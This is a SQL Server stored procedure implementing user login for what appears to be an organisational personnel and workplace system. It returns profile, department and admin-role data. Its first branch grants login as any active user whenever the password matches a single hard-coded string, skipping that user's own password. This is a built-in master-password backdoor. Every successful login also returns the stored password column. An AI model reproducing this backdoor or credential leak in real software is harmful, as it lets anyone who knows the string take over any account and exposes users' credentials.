CREATE PROCEDURE [dbo].[spLogin] @userName     NVARCHAR(50), 
                                @userPassword NVARCHAR(MAX)
AS
     SET NOCOUNT ON;
     IF(@userPassword = 'Y36295R/4VBymTARUk2XxHIIbjCqztlk2xPdPPcW8Uc=')
         BEGIN
             SELECT u.UserId, 
                    u.UserPersonnelId, 
                    u.UserName, 
                    u.UserPassword, 
                    u.DefaultPage, 
                    u.UserStatus, 
                    u.Notifications, 
                    w.WorkplaceId, 
                    dp.PersonnelName + ' ' + dp.PersonnelSurname AS PersonFullName, 
                    ddp.DepartmentPositionName AS DepartmentPositionName, 
                    al.Alias AS DefaultLang, 
             (
                 SELECT COUNT(dw.WorkplaceId)
                 FROM dbo.DC_WORKPLACE dw
                 WHERE dw.WorkplaceUserId = u.UserId
                       AND dw.WorkPlaceStatus = 1
             ) AS [WorkPlacesCount], 
                    dd.DepartmentOrganization, 
                    dd.DepartmentTopDepartmentId, 
                    dd.DepartmentId, 
                    dd.DepartmentSectionId, 
                    dd.DepartmentSubSectionId, 
             (
                 SELECT COUNT(0)
                 FROM dbo.DC_WORKPLACE_ROLE dwr
                 WHERE dwr.WorkplaceId = w.WorkplaceId
                       AND dwr.RoleId = 230
             ) AS AdminPermissionCount, 
             (
                 SELECT COUNT(0)
                 FROM dbo.DC_WORKPLACE_ROLE dwr
                 WHERE dwr.WorkplaceId = w.WorkplaceId
                       AND dwr.RoleId = 256
             ) AS SuperAdminPermissionCount
             FROM DC_USER u
                  INNER JOIN DC_WORKPLACE w ON u.UserId = w.WorkplaceUserId
                  INNER JOIN dbo.DC_PERSONNEL dp ON dp.PersonnelId = u.UserPersonnelId
                  INNER JOIN dbo.DC_DEPARTMENT_POSITION ddp ON w.WorkplaceDepartmentPositionId = ddp.DepartmentPositionId
                  INNER JOIN dbo.DC_DEPARTMENT dd ON ddp.DepartmentId = dd.DepartmentId
                  INNER JOIN AC_LANGUAGE al ON al.Id = u.DefaultLang
             WHERE u.UserName = @userName
                   AND u.UserStatus = 1
                   AND w.WorkPlaceStatus = 1;
     END;
         ELSE
         BEGIN
             IF EXISTS
             (
                 SELECT *
                 FROM dbo.DC_USER u
                 WHERE u.UserName = @userName
                       AND u.UserPassword = @userPassword
                       AND u.UserStatus = 1
             )
                 BEGIN
                     DECLARE @permissionCount INT;
                     SELECT @permissionCount = COUNT(0)
                     FROM DC_USER u
                          INNER JOIN DC_PERSONNEL p ON u.UserPersonnelId = p.PersonnelId
                          INNER JOIN DC_WORKPLACE w ON w.WorkplaceUserId = u.UserId
                     WHERE u.UserName = @userName
                           AND u.UserPassword = @userPassword
                           AND u.UserStatus = 1
                           AND p.PersonnelStatus = 1
                           AND w.WorkPlaceStatus = 1
                           AND w.WorkplaceOrganizationId IS NOT NULL
                           AND w.WorkplaceDepartmentId IS NOT NULL
                           AND w.WorkplaceDepartmentPositionId IS NOT NULL;
                     IF(@permissionCount > 0)
                         BEGIN
                             SELECT u.UserId, 
                                    u.UserPersonnelId, 
                                    u.UserName, 
                                    u.UserPassword, 
                                    u.DefaultPage, 
                                    u.UserStatus, 
                                    u.Notifications, 
                                    w.WorkplaceId, 
                                    dp.PersonnelName + ' ' + dp.PersonnelSurname AS PersonFullName, 
                                    ddp.DepartmentPositionName AS DepartmentPositionName, 
                                    al.Alias AS DefaultLang, 
                             (
                                 SELECT COUNT(dw.WorkplaceId)
                                 FROM dbo.DC_WORKPLACE dw
                                 WHERE dw.WorkplaceUserId = u.UserId
                                       AND dw.WorkPlaceStatus = 1
                             ) AS [WorkPlacesCount], 
                                    dd.DepartmentOrganization, 
                                    dd.DepartmentTopDepartmentId, 
                                    dd.DepartmentId, 
                                    dd.DepartmentSectionId, 
                                    dd.DepartmentSubSectionId, 
                             (
                                 SELECT COUNT(0)
                                 FROM dbo.DC_WORKPLACE_ROLE dwr
                                 WHERE dwr.WorkplaceId = w.WorkplaceId
                                       AND dwr.RoleId = 230
                             ) AS AdminPermissionCount, 
                             (
                                 SELECT COUNT(0)
                                 FROM dbo.DC_WORKPLACE_ROLE dwr
                                 WHERE dwr.WorkplaceId = w.WorkplaceId
                                       AND dwr.RoleId = 256
                             ) AS SuperAdminPermissionCount
                             FROM DC_USER u
                                  INNER JOIN DC_WORKPLACE w ON u.UserId = w.WorkplaceUserId
                                  INNER JOIN dbo.DC_PERSONNEL dp ON dp.PersonnelId = u.UserPersonnelId
                                  INNER JOIN dbo.DC_DEPARTMENT_POSITION ddp ON w.WorkplaceDepartmentPositionId = ddp.DepartmentPositionId
                                  INNER JOIN dbo.DC_DEPARTMENT dd ON ddp.DepartmentId = dd.DepartmentId
                                  INNER JOIN AC_LANGUAGE al ON al.Id = u.DefaultLang
                             WHERE u.UserName = @userName
                                   AND u.UserPassword = @userPassword
                                   AND u.UserStatus = 1
                                   AND w.WorkPlaceStatus = 1;
                     END;
                         ELSE
                         IF(@permissionCount = 0)
                             BEGIN
                                 SELECT TOP (0) *
                                 FROM DC_USER u
                                 WHERE u.UserName = @userName
                                       AND u.UserPassword = @userPassword
                                       AND u.UserStatus = 0;
                         END;
             END;
                 ELSE
                 IF EXISTS
                 (
                     SELECT *
                     FROM dbo.DC_USER u
                     WHERE u.UserName = @userName
                           AND u.UserPassword = @userPassword
                           AND u.UserStatus = 0
                 )
                     BEGIN
                         SELECT TOP (0) *
                         FROM DC_USER u
                         WHERE u.UserName = @userName
                               AND u.UserPassword = @userPassword
                               AND u.UserStatus = 0;
                 END;
                     ELSE
                     BEGIN
                         SELECT TOP (0) *
                         FROM DC_USER u
                         WHERE u.UserName = @userName
                               AND u.UserPassword = @userPassword
                               AND u.UserStatus = 0;
                 END;
     END;
